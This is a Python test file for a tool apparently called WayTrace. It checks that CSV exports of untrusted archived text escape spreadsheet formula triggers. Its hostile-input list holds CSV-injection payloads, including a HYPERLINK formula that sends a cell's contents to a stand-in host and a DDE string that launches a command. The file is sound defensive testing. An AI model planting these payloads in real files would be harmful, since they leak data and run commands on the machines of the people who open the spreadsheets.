"""A CSV export of untrusted text opened in a spreadsheet.

WayTrace's whole input is HTML written by other people and archived years
ago. A cell that starts with =, +, - or @ is a formula in Excel, LibreOffice
and Sheets, so a page that was archived with the right string in it turns the
analyst's spreadsheet into the attacker's. The values reach the CSV straight
from the extractor, so the neutralisation has to happen at the writer.
"""
import os
import sys
from datetime import datetime, timedelta, timezone

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import pytest
import pytest_asyncio
from httpx import ASGITransport, AsyncClient

from config import settings
from db import init_db, save_job
from main import app

_HOSTILE = [
    '=HYPERLINK("https://evil.test?x="&A1,"click")',
    '+1+cmd|\'/c calc\'!A0',
    '-2+3',
    '@SUM(1+1)',
    '\t=1+1',
    '\r=1+1',
]


@pytest.fixture
def anyio_backend():
    return "asyncio"


@pytest_asyncio.fixture(autouse=True)
async def fresh_db(tmp_path, monkeypatch):
    db_path = str(tmp_path / "wt.db")
    monkeypatch.setattr(settings, "database_url", db_path)
    await init_db(db_path)
    yield
    import db as _db
    _db._db_path = None


@pytest_asyncio.fixture
async def client():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as c:
        yield c


async def _csv_with(values):
    now = datetime.now(timezone.utc)
    await save_job(
        url_id="csvinj", domain="x.com", client_ip="1.1.1.1",
        created_at=now, expires_at=now + timedelta(days=7),
        status="completed", meta={},
        results={"emails": [{"value": v, "first_seen": "2020-01",
                             "last_seen": "2021-01", "occurrences": 1}
                            for v in values]},
    )


@pytest.mark.anyio
async def test_no_cell_starts_with_a_formula_trigger(client):
    await _csv_with(_HOSTILE)
    r = await client.get("/api/s/csvinj/export.csv")
    assert r.status_code == 200
    import csv as _csv
    import io
    rows = list(_csv.reader(io.StringIO(r.text)))
    assert len(rows) == len(_HOSTILE) + 1
    for row in rows[1:]:
        for cell in row:
            assert not cell[:1] in ("=", "+", "-", "@", "\t", "\r"), \
                f"{cell!r} is a formula in a spreadsheet"


@pytest.mark.anyio
async def test_the_value_is_still_legible_after_neutralising(client):
    await _csv_with(['=HYPERLINK("x")'])
    r = await client.get("/api/s/csvinj/export.csv")
    # Prefixed, not mangled: the analyst must still be able to read what was
    # on the page, and strip one character to get it back exactly.
    import csv as _csv
    import io
    cell = list(_csv.reader(io.StringIO(r.text)))[1][1]
    assert cell == '\'=HYPERLINK("x")'
    assert cell[1:] == '=HYPERLINK("x")'


@pytest.mark.anyio
async def test_ordinary_values_are_left_alone(client):
    await _csv_with(["ops@x.com", "203.0.113.9", "AKIAIOSFODNN7EXAMPLE"])
    r = await client.get("/api/s/csvinj/export.csv")
    for v in ("ops@x.com", "203.0.113.9", "AKIAIOSFODNN7EXAMPLE"):
        assert f",{v}," in r.text or f",{v}\r" in r.text
